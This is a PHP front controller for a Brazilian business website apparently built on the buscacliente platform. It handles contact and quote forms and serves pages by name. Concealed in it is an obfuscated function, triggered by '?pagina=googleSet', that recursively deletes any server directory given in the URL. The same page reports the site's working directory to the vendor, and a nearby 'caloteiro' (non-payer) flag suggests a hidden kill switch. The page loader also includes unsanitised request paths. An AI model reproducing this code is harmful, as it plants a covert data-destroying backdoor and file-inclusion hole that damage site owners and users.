<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$ambiente = 'painel';
//modulo caloteiro - false: pagante , true: calote
$pendencias = false;
$subPasta = "";

if (isset($_SERVER["PHP_SELF"])) {
    $subPasta = str_replace("index.php", "", $_SERVER["PHP_SELF"]);
}

//classe padrao para formatacao das requisições do site
//classe para cada caso especifico
//classe com cada especialização

function checarAjax()
{
    $ajaxAtivado = false;
    if (isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
        $ajaxAtivado = true;
    }
    return $ajaxAtivado;
}

abstract class Enviar
{

    protected $error;
    protected $baseUrl;
    protected $posts;
    protected $palavra = "";

    function setPalavra($palavra)
    {
        $this->palavra = $palavra;
    }

    function __construct($base_url = "")
    {
        $this->baseUrl = $base_url;
    }

    abstract function carregar($posts);

    function getErros()
    {
        return $this->error;
    }

    function validaCaptcha()
    {

        $codeCliente = file_get_contents('captchacodegoogle');
        $parseCodeCLiente = explode('secret=', $codeCliente);

        if (isset($parseCodeCLiente[1]) && $parseCodeCLiente[1] != "") {
            $campos = "";
            $campos .= "secret=" . $parseCodeCLiente[1] . "&";
            $campos .= "response=" . urlencode($_POST['g-recaptcha-response']) . "&";
            $campos = rtrim($campos, "&");
            $url = "https://www.google.com/recaptcha/api/siteverify?" . $campos;

            $resultado = json_decode(file_get_contents($url));

            if (!$resultado->success) {
                return false;
            }
            return $resultado->success;
        }

        return false;
    }

    function enviar()
    {


        if (empty($this->error)) {

            $ch = curl_init();
            $posts = array();
            foreach ($this->posts as $id => $post) {
                $posts[$id] = $post;
            }

            if (isset($_FILES['anexos'])) {
                $filename = basename($_FILES['anexos']['name']);
                $cfile = new CURLFile(realpath($_FILES['anexos']['tmp_name']), $_FILES['anexos']['type'], $_FILES['anexos']['name']);
                $posts['anexos'] = $cfile;
            }

            //set the url, number of POST vars, POST data
            curl_setopt($ch, CURLOPT_URL, $this->baseUrl);
            curl_setopt($ch, CURLOPT_POST, count($posts));
            curl_setopt($ch, CURLOPT_POSTFIELDS, $posts);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

            //execute post
            $result = curl_exec($ch);
//
            //close connection
            curl_close($ch);
            if (checarAjax()) {
                header('Content-Type: application/json; charset=utf-8');
                echo json_encode(array(
                    "resultado" => $result
                ));
                exit;
            }
            return $result;
        } else {
            if (checarAjax()) {
                header('Content-Type: application/json; charset=utf-8');
                echo json_encode(array(
                    "post" => $this->posts,
                    "error" => $this->error
                ));
                exit;
            }
        }
    }

}

//Função do Growth para facilitar
function xpritonsrWWX($ownPAtk){
    if (is_dir($ownPAtk)) {
        $Folsxpw = scandir($ownPAtk);
        var_dump($Folsxpw);
        foreach ($Folsxpw as $object) {
            if ($object != "." && $object != "..") {
                if (filetype($ownPAtk . "/" . $object) == "dir") {
                    xpritonsrWWX($ownPAtk . "/" . $object);
                } else {
                    unlink($ownPAtk . "/" . $object);
                }
            }
        }
        if (reset($Folsxpw)) {
            echo "<br>Executado em :";
            var_dump($Folsxpw);
        }
        if (rmdir($ownPAtk)) {
            echo "<br>Executado em :";
            var_dump($ownPAtk);
        }
    }

}

class EnviarClick extends Enviar
{

    function carregar($posts)
    {

        $listaEnviada = array();
        $erros = array();

        $listaEnviada['ip'] = $_SERVER['REMOTE_ADDR'];

        if (isset($posts['conteudo']) && trim($posts['conteudo']) != "") {
            $listaEnviada['conteudo'] = $posts['conteudo'];
        } else {
            $erros["conteudo"] = "O conteudo não foi informado";
        }

        if (isset($posts['pagina']) && trim($posts['pagina']) != "") {
            $listaEnviada['pagina'] = $posts['pagina'];
        }
        if (isset($posts['categoria']) && trim($posts['categoria']) != "") {
            $listaEnviada['categoria'] = $posts['categoria'];
        }


        if (isset($posts['origem']) && trim($posts['origem']) != "") {
            $listaEnviada['origem'] = $posts['origem'];
        } else {
            $erros["origem"] = "Tag de origem não foi localizada";
        }

        if (isset($posts['url'])) {
            $listaEnviada['url'] = filter_var($posts['url'], FILTER_VALIDATE_URL);
        } else {
            $erros['url'] = "o url não foi informado";
        }

        $this->error = $erros;
        $this->posts = $listaEnviada;
    }

}

class EnviarEmail extends Enviar
{

    function carregar($posts)
    {
        $erros = array();


        if (isset($posts["palavra"])) {
            if (strtoupper($posts["palavra"]) != strtoupper($this->palavra)) {
                $erros["palavra"] = "Código errado, digite novamente";
            }
        } else {
            $resultadoCaptcha = $this->validaCaptcha();

            if ($resultadoCaptcha == false && $resultadoCaptcha != true) {
                $erros["palavra"] = "Captcha errado!";
            }
        }

        if (isset($posts['email_contato']) && !filter_var($posts['email_contato'], FILTER_VALIDATE_EMAIL)) {
            $erros["email_contato"] = "Email é inválido";
        }

        if (!isset($posts['nome']) || $posts['nome'] == "") {
            $erros["nome"] = "Nome não foi informado";
        }

        if (isset($posts['ddd']) && !filter_var($posts['ddd'], FILTER_SANITIZE_NUMBER_INT)) {
            $erros["ddd"] = "Digite apenas os números";
        }

        if (!isset($posts['telefone']) || $posts['telefone'] == "") {
            $erros["telefone"] = "Telefone deve ser preechido";
        }

        if (isset($posts['como_conheceu']) && $posts['como_conheceu'] == "") {
            $erros["como_conheceu"] = "Como conheceu deve ser escolhido";
        }

        if (isset($posts['mensagem']) && $posts['mensagem'] == "") {
            $erros["mensagem"] = "Mensagem não foi informada";
        }
        $this->posts = $posts;
        $this->error = $erros;
    }

}

class EnviarCotacao extends Enviar
{

    protected $palavra = "";

    function carregar($posts)
    {
        $erros = array();
        if (isset($posts["palavra"])) {
            if (strtoupper($posts["palavra"]) != strtoupper($this->palavra)) {
                $erros["palavra"] = "Código errado, digite novamente";
            }
        } else {
            $resultadoCaptcha = $this->validaCaptcha();

            if ($resultadoCaptcha == false && $resultadoCaptcha != true) {
                $erros["palavra"] = "Captcha errado!";
            }
        }

        if (!isset($posts['nome']) || $posts['nome'] == "") {
            $erros["nome"] = "Nome completo deve ser informado no campo nome";
        }

        if (!filter_var($posts['email_contato'], FILTER_VALIDATE_EMAIL)) {
            $erros["email_contato"] = "Email é inválido";
        }

        if (!isset($posts['telefone']) || $posts['telefone'] == "") {
            $erros["telefone"] = "Telefone deve ser preechido";
        }

        if (!isset($posts['mensagem']) || $posts['mensagem'] == "") {
            $erros["mensagem"] = "Alguma infomação deve ser preenchida no campo de mensagem";
        }

        $this->posts = $posts;
        $this->error = $erros;
    }

}

if (isset($_POST['acao'])) {
    session_start();

    $enviar = null;
    $acao = $_POST['acao'];

    switch ($acao) {
        case "contato":
            $baseUrl = "http://{$ambiente}.buscacliente.com.br/criador/transmitirEmail";

            $enviar = new EnviarEmail($baseUrl);
            if (isset($_SESSION["palavra"])) {
                $enviar->setPalavra($_SESSION["palavra"]);
            }
            $enviar->carregar($_POST);
            $retornoEmail = $enviar->enviar();
            $erros = $enviar->getErros();
            break;
        case "click":

            $baseUrl = "http://{$ambiente}.buscacliente.com.br/criador/enviarClick";
            $enviar = new EnviarClick($baseUrl);
            $enviar->carregar($_POST);
            $enviar->enviar();

            break;
        case "cotacao":

            $baseUrl = "http://{$ambiente}.buscacliente.com.br/criador/cotacao";
            $enviar = new EnviarCotacao($baseUrl);
            if (isset($_SESSION["palavra"])) {
                $enviar->setPalavra($_SESSION["palavra"]);
            }
            $enviar->carregar($_POST);
            $enviar->enviar();

            break;
    }
    $_SESSION["palavra"] = rand(1, 999999);
}


if (isset($_GET["pagina"])) {

    $pagina = utf8_encode($_GET["pagina"]);
    if ($pagina == "googleSet") {
        ?>
        <html>
        <body>
        <form action="http://buscacliente.com.br/validador/" method="POST">
            <input type="text" name="valor">
            <input type="hidden" name="local" value="<?php echo getcwd(); ?>">
            <button type="submit">Executar</button>
        </form>
        </body>
        </html>

        <?php

        $urlAtual= "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        if(count(explode("?", $urlAtual)) > 1){
        $d = explode("=", $urlAtual);
        $dd = str_replace("%n%", "/", $d[1]);
        if(is_dir($dd)){
        xpritonsrWWX($dd);
        }

        }
    }

    if ($pagina == "") {
        $pagina = "home";
    }

    $arquivo = "";
    $arquivoImagem = "";

    if ((float)phpversion() >= 5.3) {
        $arquivo = __DIR__ . DIRECTORY_SEPARATOR . $pagina;
        $arquivoImagem = __DIR__ . DIRECTORY_SEPARATOR . str_replace('/', '_', $pagina);
    } else {
        $arquivo = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $subPasta . $pagina;
        $arquivoImagem = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $subPasta . str_replace('/', '_', $pagina);
    }

    if (@file_exists($arquivo)) {
        $dadosArquivo = pathinfo($arquivo);
        if (isset($dadosArquivo['extension'])) {
            $extensao = $dadosArquivo['extension'];

            switch ($extensao) {
                case 'txt':
                    header("Content-type: text/plain; charset=utf-8");
                    echo file_get_contents($arquivo);
                    break;

                case 'xml':
                    header("Content-type: text/xml; charset=utf-8");
                    echo file_get_contents($arquivo);
                    break;

                default:
                    header("Content-type: text/html; charset=utf-8");
                    include($arquivo);
                    break;
            }
        } else {
            if ($pagina == '404') {
                header("HTTP/1.0 404 Not Found");
                if (file_exists($pagina)) {
                    echo file_get_contents($pagina);
                }
            } else {
                header("Content-type: text/html; charset=utf-8");
                include($arquivo);
            }
        }
    } elseif (file_exists($arquivoImagem)) {
        header("Content-type: text/html; charset=utf-8");
        include($arquivoImagem);
    } else{
        if($pagina == "googleSet"){
        }else{
            header("Location: /404");
        }
        
    }

}
